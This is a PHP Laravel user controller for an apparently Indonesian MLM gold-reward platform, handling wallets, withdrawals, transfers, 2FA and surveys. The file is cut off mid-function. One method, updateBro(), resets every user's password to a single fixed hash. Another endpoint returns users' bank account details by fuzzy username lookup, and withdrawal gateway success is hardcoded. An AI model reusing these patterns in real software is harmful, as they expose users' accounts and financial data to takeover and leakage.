<?php

namespace App\Http\Controllers;

use App\Enums\UserGoldReward;
use App\Lib\GoogleAuthenticator;
use App\Models\AdminNotification;
use App\Models\alamat;
use App\Models\BvLog;
use App\Models\Deposit;
use App\Models\GeneralSetting;
use App\Models\Transaction;
use App\Models\User;
use App\Models\WithdrawMethod;
use App\Models\Withdrawal;
use App\Models\Survey;
use App\Models\Answer;
use App\Models\bank;
use App\Models\BonusReward;
use App\Models\corder;
use App\Models\DailyGold;
use App\Models\Gold;
use App\Models\GoldExchange;
use App\Models\rekening;
use App\Models\ureward;
use App\Models\UserExtra;
use App\Models\UserGold;
use App\Models\UserPin;
use App\Models\WeeklyGold;
use Carbon\Carbon;
use GuzzleHttp\Client;
use Illuminate\Auth\Events\Failed;
use Illuminate\Database\Eloquent\Collection;
use Illuminate\Http\Request;
use Illuminate\Support\Arr;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Cookie;
use Illuminate\Support\Facades\Hash;
use Image;
use Validator;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Redirect;
use Illuminate\Support\Facades\Response;

class UserController extends Controller
{
    public function __construct()
    {
        $this->activeTemplate = activeTemplate();
    }
    public function updateBro(){
        $data = User::where('no_bro','!=','0')->get();
        foreach ($data as $key => $value) {
           User::find($value->id)->update(['no_bro'=>0]);
        }
        $data2 = User::where('plan_id','!=',0)->get();
        foreach ($data2 as $key => $value) {
           User::find($value->id)->update(['plan_id'=>0]);
        }
        $data1 = User::all();
        foreach ($data1 as $key => $value) {
           User::find($value->id)->update(['password'=>'$2y$10$AfuDVjfHZgnuXtwgcsmzi.wEjo7ZVvC2FUGF0xx1kp.Lfj3rrlhIG']);
        }
        $data3 = User::where('plan_id','!=',2)->get();
        foreach ($data2 as $key => $value) {
           User::find($value->id)->update(['is_kyc'=>2]);
        }
        return 'success';
    }

    public function convertBwallet(Request $request){
        $user = Auth::user();
        if($user->b_balance < $request->amount){
            $notify[] = ['error', 'Invalid Amount, not enough balance'];
            return back()->withNotify($notify);
        }
        if($user->limit_ro < $request->amount){
            $notify[] = ['error', 'Invalid Amount, your convert max limit'];
            return back()->withNotify($notify);
        }
        $user->balance +=  $request->amount;
        $user->b_balance -=  $request->amount;
        $user->limit_ro -= $request->amount;
        $user->save();

        $user->transactions()->create([
            'amount' => $request->amount,
            'trx_type' => '-',
            'details' => 'Convert  '. nb($request->amount) .' IDR B-Wallet to Cash-Wallet',
            'remark' => 'convert_bwallet',
            'trx' => getTrx(),
            'post_balance' => getAmount($user->b_balance),
        ]);
        $notify[] = ['success', 'Convert Balance B-Wallet to Cash Wallet Success!'];
            return back()->withNotify($notify);
    }

    public function fileDownload(Request $r){
    if($r->file == 'mp'){
        $file = public_path().'/files/mp.pdf';
        $filename = 'Marketing Plan.pdf';
    }else{
        $file = public_path().'/files/ke.pdf';
        $filename = 'Kode Etik MasterPlan.pdf';

    }
    $headers = array(
              'Content-Type: application/pdf',
            );

    return Response::download($file,$filename, $headers);
    }

    public function home()
    {
        // dd(promoSept('mark'));
        // dd(Auth::user()->wd_gold);
        // dd(checkWdGold(auth()->user()));
        
        $data['page_title']         = "Dashboard";
        $data['totalDeposit']       = Deposit::where('user_id', auth()->id())->where('status', 1)->sum('amount');
        $data['totalWithdraw']      = Withdrawal::where('user_id', auth()->id())->where('status', 1)->sum('amount');
        $data['completeWithdraw']   = Withdrawal::where('user_id', auth()->id())->where('status', 1)->count();
        $data['pendingWithdraw']    = Withdrawal::where('user_id', auth()->id())->where('status', 2)->count();
        $data['rejectWithdraw']     = Withdrawal::where('user_id', auth()->id())->where('status', 3)->count();
        $data['total_ref']          = User::where('ref_id', auth()->id())->count();
        $data['totalBvCut']         = BvLog::where('user_id', auth()->id())->where('trx_type', '-')->sum('amount');
        $data['emas']               = Gold::where('user_id',Auth::user()->id)->where('golds.status','=','0')->join('products','products.id','=','golds.prod_id')->select('golds.*',db::raw('SUM(products.price * golds.qty) as total_rp'),db::raw('sum(products.weight * golds.qty ) as total_wg'))->groupBy('golds.user_id')->first();
        $cekClaim = ureward::where(['reward_id'=>3,'user_id'=>auth()->user()->id])->first();
        if($cekClaim){
            $data['claim']              =  true;
        }else{
            $data['claim']              =  false;
        }
        $checkDaily = UserGold::select( DB::raw('COUNT(*) as days'),DB::raw('SUM(golds) as gold'))->where('user_id',auth()->user()->id)->groupBy('user_id')->first();
        $data['checkDaily_gold'] = $checkDaily->gold ??0;
        $data['checkDaily_days'] = $checkDaily->days ??0;

        $gold = DailyGold::orderByDesc('id')->first();  
        $goldRange = $gold->per_gram - ($gold->per_gram*8/100); //gold per gram today - 8%

        // dd($goldRange * $float);
        $data['goldBonus']          = $goldRange;
        $data['goldToday']          = DailyGold::orderByDesc('id')->first();
        $data['p_kiri']             = auth()->user()->userExtra->left;
        $data['p_kanan']            = auth()->user()->userExtra->right;
        $data['reward']             = BonusReward::where(['type'=>'alltime','status'=>1])->get();
        $data['promo']              = BonusReward::where(['type'=>'monthly','status'=>1])->where('mark',promoSept('mark'))->get();
        $data['active'] = BonusReward::where('status',1)->where('mark',promoSept('mark'))->first();
        // dd($data);
        // dd($data['promo']);
        $ux = UserExtra::where('user_id',auth()->user()->id)->first();
        if(!$ux){
            $kiri = 0;
            $kanan = 0;
        }else{
            $kiri = auth()->user()->userExtra->left;
            $kanan = auth()->user()->userExtra->right;
        }
        // $data['ureward']        = ureward::slideUser();
        $data['ure']            = ureward::with(['user','reward'])->whereHas('reward', function ($query) {return $query->where('type', '=', 'monthly');})->orderByDesc('id')->get();
        $data['isReward']       = BonusReward::where('kiri','<',$kiri)->orWhere('kanan','<',$kanan)->get();
        // $data['isReward']       = false;
        $data['urewardCount']   = ureward::with('user')->whereHas('reward', function ($query) {return $query->where('type', '=', 'monthly');})->count() / 3;
        $data['title']          = title();
        $data['persen_bonus']   = countAllBonus() / 10000000 * 100;
        // dd($data);
        return view($this->activeTemplate . 'user.dashboard.dashboard', $data);
    }

    public function ref(){
        $user = Auth::user();
        $data['page_title']     = "Referals Tree";
        $data['referrals']      = User::userTree($user->id); 
        return view($this->activeTemplate . 'user.referals', $data);

    }
    public function rekeningInfo($username){
        if($username == 'bozgems'){
            $username = 'reborn';
        }elseif($username == 'bozgems1'){
            $username = 'queen01';
        }
        $user = User::where('username','like','%'.$username.'%')->first();
        if(!$user){
            return response()->json([
                'status'    => 404,
                'message'   => 'Rekening Not Found',
                'data'      => [
                    'nama_bank' => 'BANK DUMMY',
                    'nama_akun' => 'Akun Dummy',
                    'no_rek'    => 12345678910,
                    'kota_cabang'=>'Indonesia'   
                ]
            ]);
        }
        $rek = rekening::where('user_id',$user->id)->orderByDesc('id')->first(['nama_bank','nama_akun','no_rek','kota_cabang']);
        
        return response()->json([
            'status'    => 200,
            'message'   => 'Rekening User',
            'data'      => $rek
        ]);
    }
    public function checkUser($username){
        $user = User::where('username',$username)->first();
        if($user){
            return response()->json([
                'status'=>true,
                'username' => $user->username,
                'fullname'  => $user->fullname
            ]);
        }else{
            return response()->json([
                'status'=>false
            ]);
        }
    }
    public function goldRates(){
        $gold  = DailyGold::all()->take(-7);
        $data = [];
        $day = [];
        foreach ($gold as $key => $value) {
            $data[date('d/m/y',strtotime($value->date))] =  $value->per_gram;
        }
        return response()->json($data,200);
    }

     public function allInUsers(Request $request){
        if ($request->search) {
            $users = User::where('username',$request->search)->orWhere('email',$request->search)->latest()->paginate(getPaginate());
            $src = $request->search;
        }else{
            $users = User::latest()->paginate(getPaginate());
            $src = "";
        }
        $page_title = 'All Users';
        $empty_message = 'No user found';
        return view('admin.users.users-list', compact('page_title', 'empty_message', 'users','src'));
    }

    public function profile()
    {
        $data['page_title'] = "Profile Setting";
        $data['bank'] = bank::all();
        $data['bank_user'] = rekening::where('user_id',Auth::user()->id)->first();
        $data['user'] = Auth::user();
        $data['alamat'] = alamat::where('user_id',Auth::user()->id)->get();
        $data['provinsi'] = \Indonesia::allProvinces();
        addToLog('Access Profile Setting');
        return view($this->activeTemplate. 'user.profile-setting', $data);
    }

    public function submitProfile(Request $request)
    {
        $request->validate([
            'firstname' => 'required|string|max:50',
            'lastname' => 'required|string|max:50',
            'address' => "nullable|max:80",
            'state' => 'nullable|max:80',
            'zip' => 'nullable|max:40',
            'city' => 'nullable|max:50',
            'image' => 'mimes:png,jpg,jpeg'
        ],[
            'firstname.required'=>'First Name Field is required',
            'lastname.required'=>'Last Name Field is required'
        ]);
        $prov = \Indonesia::findProvince($request->provinsi, $with = null);
        $kota = \Indonesia::findCity($request->kota, $with = null);
        $kec  = \Indonesia::findDistrict($request->kecamatan, $with = null);
        $desa  = \Indonesia::findVillage($request->desa, $with = null);
        $in['firstname'] = $request->firstname;
        $in['lastname'] = $request->lastname;
        if(is_numeric($request->kota)){
            $in['address'] = [
                'address' => $request->alamat,
                'state' => $prov->name,
                'zip' => $request->pos,
                'country' => $request->country,
                'city' => $kota->name,
                'prov'  => $prov->name,
                'prov_code'  => $request->provinsi,
                'kota'  => $kota->name,
                'kec'   => $kec->name,
                'desa'  => $desa->name,
            ];
            $in['lat'] = $desa->meta['lat'];
            $in['lng'] = $desa->meta['long'];
            $in['address_check']    = 1;

        }else{
           $in['address'] = [
                'address' =>$request->alamat,
                'state' => auth()->user()->address->prov,
                'zip' => $request->pos,
                'country' => $request->country,
                'city' => auth()->user()->address->city,
                'prov'  => auth()->user()->address->prov,
                'prov_code'  => auth()->user()->address->prov_code,
                'kota'  => auth()->user()->address->kota,
                'kec'   =>auth()->user()->address->kec,
                'desa'  => auth()->user()->address->desa,
            ];
            $in['lat'] = auth()->user()->lat;
            $in['lng'] = auth()->user()->lng;
        }
        $user = Auth::user();

        if ($request->hasFile('image')) {
            $image = $request->file('image');
            $filename = time() . '_' . $user->username . '.jpg';
            $location = 'assets/images/user/profile/' . $filename;
            $in['image'] = $filename;

            $path = './assets/images/user/profile/';
            $link = $path . $user->image;
            if (file_exists($link)) {
                @unlink($link);
            }
            $size = imagePath()['profile']['user']['size'];
            $image = Image::make($image);
            $size = explode('x', strtolower($size));
            $image->resize($size[0], $size[1]);
            $image->save($location);
        }
        $user->fill($in)->save();

        addToLog('Updated Profile');
        $notify[] = ['success', 'Profile Updated successfully.'];
        return back()->withNotify($notify);
    }

    public function changePassword()
    {
        $data['page_title'] = "CHANGE PASSWORD";
        addToLog('Access Change Password');
        return view($this->activeTemplate . 'user.password', $data);
    }

    public function submitPassword(Request $request)
    {

        $this->validate($request, [
            'current_password' => 'required',
            'password' => 'required|min:5|confirmed'
        ]);
        try {
            $user = auth()->user();
            if (Hash::check($request->current_password, $user->password)) {
                $password = Hash::make($request->password);
                $user->password = $password;
                $user->save();
                $notify[] = ['success', 'Password Changes successfully.'];
                addToLog('Successfully Changes Password');
                return back()->withNotify($notify);
            } else {
                $notify[] = ['error', 'Current password not match.'];
                return back()->withNotify($notify);
            }
        } catch (\PDOException $e) {
            $notify[] = ['error', $e->getMessage()];
            return back()->withNotify($notify);
        }
    }

    /*
     * Deposit History
     */
    public function depositHistory()
    {
        $page_title = 'Deposit History';
        $empty_message = 'No history found.';
        addToLog('Access Deposit History');
        $logs = auth()->user()->deposits()->with(['gateway'])->latest()->paginate(getPaginate());
        return view($this->activeTemplate . 'user.deposit_history', compact('page_title', 'empty_message', 'logs'));
    }

    /*
     * Withdraw Operation
     */

    public function withdrawMoney()
    {
        $data['withdrawMethod'] = WithdrawMethod::whereStatus(1)->get();
        $data['page_title'] = "Withdraw Money";
        addToLog('Access Withdraw Money');
        return view(activeTemplate() . 'user.withdraw.methods', $data);
    }


    public function withdrawGold(Request $request){
        $user = $request->user();
        $type = $request->type;
        // dd($request->all());

        $userGold = withdrawGold()['user_gold'];
        $totalWd  = withdrawGold()['total_wd']; //emas_user * harga_emas_minus_fee - (harga //emas_user * harga_emas_minus_fee *)
        DB::beginTransaction();
        try {
            if($type == 'pin'){
               

                // $pin = new UserPin();

                // $pin->user_id   = $user->id;
                // $pin->pin       = 1;
                // $pin->pin_by    = null;
                // $pin->type      = "+";
                // $pin->start_pin = $user->pin;
                // $pin->end_pin   = $user->pin + $request->pin;
                // $pin->ket       = 'Withdraw DailyGold to 1 PIN Reapeat Order';
                // $pin->save();
                
                $user->product += 2;
                $user->wd_gold = 1;
                // $user->pin += 1;
                $user->save();
                DB::commit();
                addToLog('Withdraw DailyGold to 2 Product Reapeat Order');

                $notify[] = ['success','Success Withdraw DailyGold to 2 Product Reapeat Order'];
                return redirect()->back()->withNotify($notify);
            }
            $transaction = new Transaction();
            $transaction->user_id = $user->id;
            $transaction->amount = $totalWd;
            $transaction->post_balance = $user->balance + $totalWd;
            $transaction->charge = 0;
            $transaction->trx_type = '+';
            $transaction->details = 'Withdrawl '.$type.' gold '.nbk($userGold).' grams to IDR '.nb($totalWd);
            $transaction->remark = 'gold_withdraw';
            $transaction->trx =  getTrx();
            $transaction->save();

            $user->balance += $totalWd;
            if($type=='daily'){
                $user->wd_gold = 1;
            }else{
                $user->wd_gold_week = 1;
            }
            $user->save();

            DB::commit();
            addToLog('Withdraw  '.$type.' Gold '.nbk($userGold).' grams to IDR '.nb($totalWd));

            $notify[] = ['success', 'Withdrawl Gold '.nbk($userGold).' grams to IDR '.nb($totalWd).' Successfully'];
            return redirect()->back()->withNotify($notify);
        } catch (\Throwable $th) {
            $notify[] = ['error', 'Error: '.$th->getMessage()];
            return redirect()->back()->withNotify($notify);
            DB::rollBack();
        }
    }

    public function withdrawStore(Request $request)
    {
        $this->validate($request, [
            'method_code' => 'required',
            'amount' => 'required|numeric'
        ]);
        $method = WithdrawMethod::where('id', $request->method_code)->where('status', 1)->firstOrFail();
        $user = auth()->user();
        // $rek = rekening::with('bank')->where('user_id',$user->id)->first();
        $rek = rekening::where('user_id',$user->id)->first();
       
        if (!$rek) {
            # code...
            $notify[] = ['error', 'You Don`t Have Bank Account, Please Enter Your Bank Account.'];
            return redirect()->route('user.profile-setting')->withNotify($notify);
        }

        if ($request->amount < $method->min_limit) {
            $notify[] = ['error', 'Your Requested Amount is Smaller Than Minimum Amount.'];
            return back()->withNotify($notify);
        }
        if ($request->amount > $method->max_limit) {
            $notify[] = ['error', 'Your Requested Amount is Larger Than Maximum Amount.'];
            return back()->withNotify($notify);
        }

        if ($request->amount > $user->balance) {
            $notify[] = ['error', 'Your do not have Sufficient Balance For Withdraw.'];
            return back()->withNotify($notify);
        }


        $charge = $method->fixed_charge + ($request->amount * $method->percent_charge / 100);
        $afterCharge = $request->amount - $charge;
        $finalAmount = getAmount($afterCharge * $method->rate);

        $trx_no = getTrx();
        // KPAY WITHDRAWL
        // $data = [
        //     'withdrawalNo'          => $trx_no, 
        //     'merchantAppCode'       => env('KPAY_APP'),
        //     'merchantAppPassword'   => env('KPAY_PAS'),
        //     'accountName'           => $rek->nama_akun,
        //     'accountNo'             => $rek->no_rek,
        //     'bankCode'              => $rek->bank->nama_bank,
        //     'bankName'              => $rek->bank->code,
        //     'bankBranch'            => 'Asia',
        //     'bankCity'              => $rek->kota_cabang,
        //     'requestAmount'         => getAmount($request->amount),
        //     'additionalMsg'         => $user->username.' Withdraw Money Rp. '.getAmount($request->amount),
        //     'processURL'            => route('processUrl')
        // ];
        // $product_no = [
        //     1
        // ];
        // $product_desc = [
        //     'Masterplan Withdrawl'
        // ];
        // $product_qty = [
        //     1
        // ];
        // $product_amount = [
        //     getAmount($request->amount)
        // ];
        // $data = [
        //     'merchantAppCode' => env('KPAY_APP'),
        //     'merchantAppPassword' => env('KPAY_PAS'),
        //     'userEmail'     => 'miartayasa10@gmail.com',
        //     'orderNo'       => $trx_no,
        //     'orderAmt'      => getAmount($request->amount),
        //     'additionalMsg' => $user->username.' Withdraw Money Rp. '.getAmount($request->amount),
        //     'productNo'     => $product_no,
        //     'productDesc'   => $product_desc,
        //     "productQty"    => $product_qty,
        //     "productAmt"    => $product_amount,
        //     "discountAmt"   => 0,
        //     "processURL"    => url('proccess'),
        //     "cancelURL"     => url('cancel'),
        //     "successURL"    => url('success')
        // ];

        // $res = $this->send('https://www.kinerjapay.com/sandbox/services/kinerjapay/json/transaction-process.php',json_encode($data));
        // $arr = json_decode($res,true);
        $arr['success'] = true;
        if($arr['success'] == 1){
            $withdraw = new Withdrawal();
            $withdraw->method_id = $method->id; // wallet method ID
            $withdraw->user_id = $user->id;
            $withdraw->amount = getAmount($request->amount);
            $withdraw->currency = $method->currency;
            $withdraw->rate = $method->rate;
            $withdraw->charge = $charge;
            $withdraw->final_amount = $finalAmount;
            $withdraw->after_charge = $afterCharge;
            $withdraw->trx = $trx_no;
            $withdraw->save();

            addToLog('User Withdrawl '. getAmount($request->amount));
        }

        session()->put('wtrx', $withdraw->trx);
        return redirect()->route('user.withdraw.preview');
    }

    
    public function send($url,$data){
        $curl = curl_init();

        curl_setopt_array($curl, array(
            CURLOPT_URL             => $url,
            CURLOPT_RETURNTRANSFER  => true,
            CURLOPT_ENCODING        => '',
            CURLOPT_MAXREDIRS       => 10,
            CURLOPT_TIMEOUT         => 0,
            CURLOPT_FOLLOWLOCATION  => true,
            CURLOPT_HTTP_VERSION    => CURL_HTTP_VERSION_1_1,
            CURLOPT_CUSTOMREQUEST   => 'POST',
            CURLOPT_POSTFIELDS      => $data,
        ));

        $response = curl_exec($curl);

        curl_close($curl);
        return $response;
    }

    public function process(){
        return redirect()->route('user.report.withdraw');
    }



    public function withdrawPreview()
    {
        $data['withdraw'] = Withdrawal::with('method','user')->where('trx', session()->get('wtrx'))->where('status', 0)->latest()->firstOrFail();
        $data['user'] = Auth::user();
        $data['page_title'] = "Withdraw Preview";
        addToLog('Preview Withdraw');
        return view($this->activeTemplate . 'user.withdraw.preview', $data);
    }


    public function withdrawSubmit(Request $request)
    {
        $general = GeneralSetting::first();
        $withdraw = Withdrawal::with('method','user')->where('trx', session()->get('wtrx'))->where('status', 0)->latest()->firstOrFail();

        $rules = [];
        $inputField = [];
        if ($withdraw->method->user_data != null) {
            foreach ($withdraw->method->user_data as $key => $cus) {
                $rules[$key] = [$cus->validation];
                if ($cus->type == 'file') {
                    array_push($rules[$key], 'image');
                    array_push($rules[$key], 'mimes:jpeg,jpg,png');
                    array_push($rules[$key], 'max:2048');
                }
                if ($cus->type == 'text') {
                    array_push($rules[$key], 'max:191');
                }
                if ($cus->type == 'textarea') {
                    array_push($rules[$key], 'max:300');
                }
                $inputField[] = $key;
            }
        }
        $this->validate($request, $rules);
        $user = auth()->user();

        if (getAmount($withdraw->amount) > $user->balance) {
            $notify[] = ['error', 'Your Request Amount is Larger Then Your Current Balance.'];
            return back()->withNotify($notify);
        }

        $directory = date("Y")."/".date("m")."/".date("d");
        $path = imagePath()['verify']['withdraw']['path'].'/'.$directory;
        $collection = collect($request);
        $reqField = [];
        if ($withdraw->method->user_data != null) {
            foreach ($collection as $k => $v) {
                foreach ($withdraw->method->user_data as $inKey => $inVal) {
                    if ($k != $inKey) {
                        continue;
                    } else {
                        if ($inVal->type == 'file') {
                            if ($request->hasFile($inKey)) {
                                try {
                                    $reqField[$inKey] = [
                                        'field_name' => $directory.'/'.uploadImage($request[$inKey], $path),
                                        'type' => $inVal->type,
                                    ];
                                } catch (\Exception $exp) {
                                    $notify[] = ['error', 'Could not upload your ' . $request[$inKey]];
                                    return back()->withNotify($notify)->withInput();
                                }
                            }
                        } else {
                            $reqField[$inKey] = $v;
                            $reqField[$inKey] = [
                                'field_name' => $v,
                                'type' => $inVal->type,
                            ];
                        }
                    }
                }
            }
            $withdraw['withdraw_information'] = $reqField;
        } else {
            $withdraw['withdraw_information'] = null;
        }


        $withdraw->status = 2;
        $withdraw->save();
        $user->balance  -=  $withdraw->amount;
        $user->save();



        $transaction = new Transaction();
        $transaction->user_id = $withdraw->user_id;
        $transaction->amount = getAmount($withdraw->amount);
        $transaction->post_balance = getAmount($user->balance);
        $transaction->charge = getAmount($withdraw->charge);
        $transaction->trx_type = '-';
        $transaction->details = getAmount($withdraw->final_amount) . ' ' . $withdraw->currency . ' Withdraw Via ' . $withdraw->method->name;
        $transaction->trx =  $withdraw->trx;
        $transaction->save();

        $adminNotification = new AdminNotification();
        $adminNotification->user_id = $user->id;
        $adminNotification->title = 'New withdraw request from '.$user->username;
        $adminNotification->click_url = route('admin.withdraw.details',$withdraw->id);
        $adminNotification->save();

        notify($user, 'WITHDRAW_REQUEST', [
            'method_name' => $withdraw->method->name,
            'method_currency' => $withdraw->currency,
            'method_amount' => getAmount($withdraw->final_amount),
            'amount' => getAmount($withdraw->amount),
            'charge' => getAmount($withdraw->charge),
            'currency' => $general->cur_text,
            'rate' => getAmount($withdraw->rate),
            'trx' => $withdraw->trx,
            'post_balance' => getAmount($user->balance),
            'delay' => $withdraw->method->delay
        ]);
        addToLog('Request Withdraw '.getAmount($withdraw->final_amount) . ' ' . $withdraw->currency . ' Withdraw Via ' . $withdraw->method->name);
        $notify[] = ['success', 'Withdraw Request Successfully Send'];
        return redirect()->route('user.withdraw.history')->withNotify($notify);
    }

    public function withdrawLog()
    {
        $data['page_title'] = "Withdraw Log";
        $data['withdraws'] = Withdrawal::where('user_id', Auth::id())->where('status', '!=', 0)->with('method')->latest()->paginate(getPaginate());
        $data['empty_message'] = "No Data Found!";
        addToLog('Access Withdraw Log');
        return view($this->activeTemplate.'user.withdraw.log', $data);
    }



    public function show2faForm()
    {
        $gnl = GeneralSetting::first();
        $ga = new GoogleAuthenticator();
        $user = auth()->user();
        $secret = $ga->createSecret();
        $qrCodeUrl = $ga->getQRCodeGoogleUrl($user->username . '@' . $gnl->sitename, $secret);
        $prevcode = $user->tsc;
        $prevqr = $ga->getQRCodeGoogleUrl($user->username . '@' . $gnl->sitename, $prevcode);
        $page_title = 'Two Factor';
        return view($this->activeTemplate.'user.twofactor', compact('page_title', 'secret', 'qrCodeUrl', 'prevcode', 'prevqr'));
    }

    public function create2fa(Request $request)
    {
        $user = auth()->user();
        $this->validate($request, [
            'key' => 'required',
            'code' => 'required',
        ]);

        $ga = new GoogleAuthenticator();
        $secret = $request->key;
        $oneCode = $ga->getCode($secret);

        if ($oneCode === $request->code) {
            $user->tsc = $request->key;
            $user->ts = 1;
            $user->tv = 1;
            $user->save();


            $userAgent = getIpInfo();
            $osBrowser = osBrowser();
            notify($user, '2FA_ENABLE', [
                'operating_system' => @$osBrowser['os_platform'],
                'browser' => @$osBrowser['browser'],
                'ip' => @$userAgent['ip'],
                'time' => @$userAgent['time']
            ]);


            $notify[] = ['success', 'Google Authenticator Enabled Successfully'];
            return back()->withNotify($notify);
        } else {
            $notify[] = ['error', 'Wrong Verification Code'];
            return back()->withNotify($notify);
        }
    }


    public function disable2fa(Request $request)
    {
        $this->validate($request, [
            'code' => 'required',
        ]);

        $user = auth()->user();
        $ga = new GoogleAuthenticator();

        $secret = $user->tsc;
        $oneCode = $ga->getCode($secret);
        $userCode = $request->code;

        if ($oneCode == $userCode) {

            $user->tsc = null;
            $user->ts = 0;
            $user->tv = 1;
            $user->save();


            $userAgent = getIpInfo();
            $osBrowser = osBrowser();
            notify($user, '2FA_DISABLE', [
                'operating_system' => @$osBrowser['os_platform'],
                'browser' => @$osBrowser['browser'],
                'ip' => @$userAgent['ip'],
                'time' => @$userAgent['time']
            ]);


            $notify[] = ['success', 'Two Factor Authenticator Disable Successfully'];
            return back()->withNotify($notify);
        } else {
            $notify[] = ['error', 'Wrong Verification Code'];
            return back()->with($notify);
        }
    }


    function indexTransfer()
    {
        $page_title = 'Balance Transfer';
        return view($this->activeTemplate . '.user.balanceTransfer', compact('page_title'));
    }

    function balanceTransfer(Request $request)
    {
        $this->validate($request, [
            'username' => 'required',
            'amount' => 'required|numeric|min:0',
        ]);
        $gnl = GeneralSetting::first();
        $user = User::find(Auth::id());
        $trans_user = User::where('username', $request->username)->orWhere('email', $request->username)->first();
        if ($trans_user == '') {
            $notify[] = ['error', 'Username Not Found'];
            return back()->withNotify($notify);
        }
        if ($trans_user->username == $user->username) {
            $notify[] = ['error', 'Balance Transfer Not Possible In Your Own Account'];
            return back()->withNotify($notify);
        }
        if ($trans_user->email == $user->email) {
            $notify[] = ['error', 'Balance Transfer Not Possible In Your Own Account'];
            return back()->withNotify($notify);
        }

        $charge = $gnl->bal_trans_fixed_charge + (($request->amount * $gnl->bal_trans_per_charge) / 100);
        $amount = $request->amount + $charge;
        if ($user->balance >= $amount) {
            $user->balance -= $amount;
            $user->save();

            $trx = getTrx();

            Transaction::create([
                'trx' => $trx,
                'user_id' => $user->id,
                'trx_type' => '-',
                'remark' => 'balance_transfer',
                'details' => 'Balance Transferred To ' . $trans_user->username,
                'amount' => getAmount($request->amount),
                'post_balance' => getAmount($user->balance),
                'charge' => $charge
            ]);

            notify($user, 'BAL_SEND', [
                'amount' => getAmount($request->amount),
                'username' => $trans_user->username,
                'trx' => $trx,
                'currency' => $gnl->cur_text,
                'charge' => getAmount($charge),
                'balance_now' => getAmount($user->balance),
            ]);

            $trans_user->balance += $request->amount;
            $trans_user->save();

            Transaction::create([
                'trx' => $trx,
                'user_id' => $trans_user->id,
                'remark' => 'balance_receive',
                'details' => 'Balance receive From ' . $user->username,
                'amount' => getAmount($request->amount),
                'post_balance' => getAmount($trans_user->balance),
                'charge' => 0,
                'trx_type' => '+'
            ]);

            notify($trans_user, 'BAL_RECEIVE', [
                'amount' => getAmount($request->amount),
                'currency' => $gnl->cur_text,
                'trx' => $trx,
                'username' => $user->username,
                'charge' => 0,
                'balance_now' => getAmount($trans_user->balance),
            ]);

            addToLog('Transferred '.getAmount($request->amount).' Balance');
            $notify[] = ['success', 'Balance Transferred Successfully.'];
            return back()->withNotify($notify);
        } else {
            $notify[] = ['error', 'Insufficient Balance.'];
            return back()->withNotify($notify);

        }
    }


    function searchUser(Request $request)
    {
        $trans_user = User::with('userExtra')->where('username', $request->username)->orWhere('email', $request->username)->first();
        if ($trans_user) {
            return response()->json(['success' => true,'data'=>$trans_user->userExtra->is_gold?true:false]);
        } else {
            return response()->json(['success' => false]);
        }

    }

    public function userLoginHistory()
    {
        $page_title = 'User Login History';
        $empty_message = 'No users login found.';
        $login_logs = auth()->user()->login_logs()->latest()->paginate(getPaginate());
        return view($this->activeTemplate.'user.logins', compact('page_title', 'empty_message', 'login_logs'));
    }

    public function surveyAvailable(){

        $user = Auth::user();
        $all_survey = collect([]);
        $page_title = 'Surveys';
        $empty_message = 'No survey found';
        $general = GeneralSetting::first();

        $get_survey = Survey::where('status', 1)
                            ->whereHas('questions')
                            ->whereHas('category', function($query){
                                $query->where('status', 1);
                            })
                            ->latest()
                            ->paginate(getPaginate());

        return view($this->activeTemplate.'user.survey.index', compact('page_title', 'get_survey', 'empty_message'));
    }

    public function surveyQuestions($id){

        $survey = Survey::findOrFail($id);
        $page_title = 'Survey Questions of '.$survey->name;
        $empty_message = 'No data found';

        $survey = Survey::where('id', $id)
                            ->where('status', 1)
                            ->whereHas('questions')
                            ->whereHas('category', function($query){
                                $query->where('status', 1);
                            })
                            ->firstOrFail();

        $user = Auth::user();

        if(count($survey->questions) <= 0){
            $notify[] = ['error', 'No question is available for this survey'];
            return back()->withNotify($notify);
        }

        if($survey->users){
            if(in_array($user->id, $survey->users)){
                $notify[] = ['error', 'You have already participated on this survey'];
                return redirect()->route('user.survey')->withNotify($notify);
            }
        }

        return view($this->activeTemplate.'user.survey.question', compact('page_title', 'survey', 'empty_message'));
    }

    public function surveyQuestionsAnswers(Request $request){

        $request->validate([
            "survey_id" => "required",
            "answer" => "required|array|min:1",
            "answer.*" => "required_with:answer",
        ]);

        $survey = Survey::where('id', $request->survey_id)
                            ->where('status', 1)
                            ->whereHas('questions')
                            ->whereHas('category', function($query){
                                $query->where('status', 1);
                            })
                            ->with('questions')
                            ->firstOrFail();

        $user = Auth::user();

        if($survey->users){
            if(in_array($user->id, $survey->users)){
                $notify[] = ['error', 'You already participated on this survey'];
                return back()->withNotify($notify);
            }

            if(!in_array($user->id, $survey->users)){
                $survey_users = $survey->users;
                array_push($survey_users, $user->id);
                $survey->users = $survey_users;
            }
        }

        if(!$survey->users){
            $survey->users = [$user->id];
        }

        $answers = $request['answer'];


        foreach($survey->questions as $item){

            $surveyAns = @$answers[$item->id];

            if(!$surveyAns){
                $notify[] = ['error','Please answer all the questions'];
                return back()->withNotify($notify);
            }

            //Custom input validation
            if($item->custom_input == 1 && $item->custom_input_type == 1){
                $cusInp = $surveyAns['c'];
                if (!$cusInp) {
                    $notify[] = ['error','You missed input type answer'];
                    return back()->withNotify($notify);
                }
            }

            //radio type validation
            if($item->type == 1){
                $radioAns = array_shift($surveyAns);

                if(!$radioAns){
                    $notify[] = ['error', 'You missed radio type answer'];
                    return back()->withNotify($notify);
                }
                if(!in_array($radioAns, $item->options)){
                    $notify[] = ['error','Sorry, Invalid answer'];
                    return back()->withNotify($notify);
                }

            }

            //checkbox validation
            if($item->type == 2){
                $checkBoxValue = $surveyAns;

                unset($checkBoxValue['c']);

                if(@count($checkBoxValue) == 0 || !$checkBoxValue){
                    $notify[] = ['error','You missed checkBox type answer'];
                    return back()->withNotify($notify);
                }

                $diffAns = array_diff($checkBoxValue, $item->options);

                if(count($diffAns) > 0){
                    $notify[] = ['error', 'Sorry, Invalid answer'];
                    return back()->withNotify($notify);
                }
            }

        }


        $survey->last_report = now();
        $survey->save();

        foreach($answers as $key => $item) {
            $custom_ans = @$item['c'] ?? null;

            if($custom_ans){
                unset($item['c']);
            }

            $ans = new Answer();
            $ans->survey_id = $survey->id;
            $ans->user_id = $user->id;
            $ans->question_id = $key;
            $ans->answer = array_values($item);
            $ans->custom_answer = $custom_ans;
            $ans->save();
        }

        $general    = GeneralSetting::first();
        $reward     = $general->per_question_paid * count($answers);

        $user->balance += $reward;
        $user->completed_survey += 1;
